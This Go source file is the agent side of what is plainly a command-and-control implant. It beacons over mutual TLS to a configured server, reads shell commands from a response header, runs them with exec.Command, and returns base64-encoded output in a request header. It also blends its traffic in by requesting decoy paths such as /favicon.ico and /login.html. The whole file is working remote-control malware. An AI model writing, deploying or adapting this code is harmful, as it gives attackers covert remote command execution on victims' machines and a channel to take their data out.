package agent

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"log"
	"math/rand"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

type Agent struct {
	Name         string
	ServerAddr   string
	CACert       []byte
	Cert         []byte
	PrivKey      []byte
	KeyPass      []byte
	IDHeader     string
	CmdHeader    string
	DataHeader   string
	RequestDelay int
}

func (a *Agent) Connect() {
	privateKeyBlock := parseECPrivateKeyWithPasphrase(a.PrivKey, a.KeyPass)
	agentCert, err := tls.X509KeyPair(a.Cert, privateKeyBlock)
	if err != nil {
		log.Fatalf("cannot get the server cert: %v", err)
	}

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				RootCAs:      a.getCertPool(),
				Certificates: []tls.Certificate{agentCert},
			},
		},
	}

	for {
		req, err := http.NewRequest("GET", getRandomURL(a.ServerAddr), nil)
		if err != nil {
			log.Fatal(err)
		}

		req.Header.Add(a.IDHeader, a.Name)

		resp, err := client.Do(req)
		if err != nil {
			log.Print(err)
		}

		// if there's a response, extract the command from CmdHeader
		// then execute the command and send the b64 results back in the DataHeader
		if resp != nil {
			cmd := strings.ReplaceAll(resp.Header.Get(a.CmdHeader), "\"", "")

			if cmd != "" {
				time.Sleep(time.Millisecond * 1800)
				splitCmd := strings.Split(cmd, " ")
				out, err := exec.Command(splitCmd[0], splitCmd[1:]...).Output()

				if err != nil {
					log.Print(err)
				} else {
					b64Result := base64.StdEncoding.EncodeToString(out)
					req, err := http.NewRequest("GET", getRandomURL(a.ServerAddr), nil)
					if err != nil {
						log.Print(err)
					}
					req.Header.Add(a.IDHeader, a.Name)
					req.Header.Add(a.DataHeader, cmd+"-"+b64Result)

					resp, err = client.Do(req)
					if err != nil {
						log.Print(err)
					}
					resp.Body.Close()
				}
			}
		}
		// sleep before sending next request
		time.Sleep(time.Millisecond * time.Duration(a.RequestDelay))
	}
}

func (a *Agent) getCertPool() (certPool *x509.CertPool) {
	certPool = x509.NewCertPool()
	if ok := certPool.AppendCertsFromPEM(a.CACert); !ok {
		log.Fatal("failed to parse CA cert")
	}
	if ok := certPool.AppendCertsFromPEM(a.Cert); !ok {
		log.Fatal("failed to parse agent cert")
	}
	return
}

func getRandomURL(addr string) (randomURL string) {
	rand.Seed(time.Now().Unix())
	randomPaths := []string{
		"/",
		"/favicon.ico",
		"/main.js",
		"/index.html",
		"/login.html",
		"/contact.html",
	}
	randomURL = addr + randomPaths[rand.Intn(len(randomPaths))]
	return
}

func parseECPrivateKeyWithPasphrase(encryptedPrivateKeyBytes, password []byte) (privateKeyBytes []byte) {
	block, _ := pem.Decode(encryptedPrivateKeyBytes)
	if block == nil {
		log.Fatalf("failed to decode private key to PEM")
	}

	decryptedPrivateKeyBytes, err := x509.DecryptPEMBlock(block, password)
	if err != nil {
		log.Fatalf("failed to decrypt private key: %v", err)
	}

	ecdsaPrivateKey, err := x509.ParseECPrivateKey(decryptedPrivateKeyBytes)
	if err != nil {
		log.Fatalf("failed to parse PEM block EC private key: %v", err)
	}

	privateKeyDERBytes, err := x509.MarshalECPrivateKey(ecdsaPrivateKey)
	if err != nil {
		log.Fatalf("failed to marshal EC private key to DER: %v", err)
	}

	keyBlock := &pem.Block{
		Type:  "EC PRIVATE KEY",
		Bytes: privateKeyDERBytes,
	}
	privateKeyBytes = pem.EncodeToMemory(keyBlock)

	return
}
